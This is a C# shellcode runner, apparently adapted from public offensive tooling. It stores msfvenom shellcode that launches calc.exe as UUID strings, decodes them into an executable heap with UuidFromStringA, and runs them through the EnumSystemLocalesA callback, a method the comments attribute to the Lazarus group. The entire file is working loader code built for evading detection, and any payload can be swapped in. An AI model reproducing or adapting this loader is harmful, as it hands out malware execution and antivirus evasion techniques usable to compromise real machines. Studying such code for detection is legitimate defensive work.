using System;
using System.Runtime.InteropServices;
// Credits: https://github.com/snovvcrash/DInjector/blob/51e40d342403fc3df0892ec68219092f41784307/DInjector/Modules/CurrentThreadUuid.cs
// Technique used by Lazarus group: https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/


namespace SC_UUID_Runner
{
    class Program
    {
        static void Main(string[] args)
        {
            // Heap space creation
            UIntPtr initSize = UIntPtr.Zero;
            UIntPtr maxSize = UIntPtr.Zero;
            uint HEAP_CREATE_ENABLE_EXECUTE = (uint)HeapCreationFlags.CREATE_ENABLE_EXECUTE;

            // msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
            // @boku7 - https://github.com/boku7/Ninja_UUID_Runner/blob/main/bin2uuids.py
            string[] uuids = {
                "e48348fc-e8f0-00c0-0000-415141505251",
                "d2314856-4865-528b-6048-8b5218488b52",
                "728b4820-4850-b70f-4a4a-4d31c94831c0",
                "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
                "48514152-528b-8b20-423c-4801d08b8088",
                "48000000-c085-6774-4801-d0508b481844",
                "4920408b-d001-56e3-48ff-c9418b348848",
                "314dd601-48c9-c031-ac41-c1c90d4101c1",
                "f175e038-034c-244c-0845-39d175d85844",
                "4924408b-d001-4166-8b0c-48448b401c49",
                "8b41d001-8804-0148-d041-5841585e595a",
                "59415841-5a41-8348-ec20-4152ffe05841",
                "8b485a59-e912-ff57-ffff-5d48ba010000",
                "00000000-4800-8d8d-0101-000041ba318b",
                "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
                "c48348d5-3c28-7c06-0a80-fbe07505bb47",
                "6a6f7213-5900-8941-daff-d563616c632e",
                "00657865-9090-9090-9090-909090909090"
            };

            // Create heap
            IntPtr hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, initSize, maxSize);
            IntPtr hAddr = IntPtr.Zero;
            
            Console.WriteLine("[?] Heap created: 0x{0}", hHeap.ToString("X"));

            // Credit: @snovvcrash
            // Pad each UUID, convert to binary and move to the created heap
            for (int i = 0; i < uuids.Length; i++)
            {
                hAddr = IntPtr.Add(hHeap, 16 * i);
                var status = UuidFromStringA(uuids[i], hAddr);
            }

            // Execute shellcode in allocated heap
            //var result = EnumSystemLocalesA(hHeap, 0);
            if (!EnumSystemLocalesA(hHeap, 0))
            {
                Console.WriteLine("[-] Execution of shellcode failed");
                Console.WriteLine("API: EnumSystemLocalesA() failed");
                return;
            }

            //Console.WriteLine("[+] EnumSystemLocaleA() - " + result);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);
        
        [DllImport("kernel32.dll")]
        static extern bool EnumSystemLocalesA(IntPtr lpLocaleEnumProc, int dwFlags);

        [DllImport("Rpcrt4.dll", EntryPoint = "UuidFromStringA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        static extern int UuidFromStringA(string stringUuid, IntPtr heapPointer);

        [Flags]
        enum HeapCreationFlags : uint
        {
            CREATE_ENABLE_EXECUTE = 0x00040000,
            GENERATE_EXCEPTIONS = 0x00000004,
            NO_SERIALIZE = 0x00000001
        }
        
    }
}
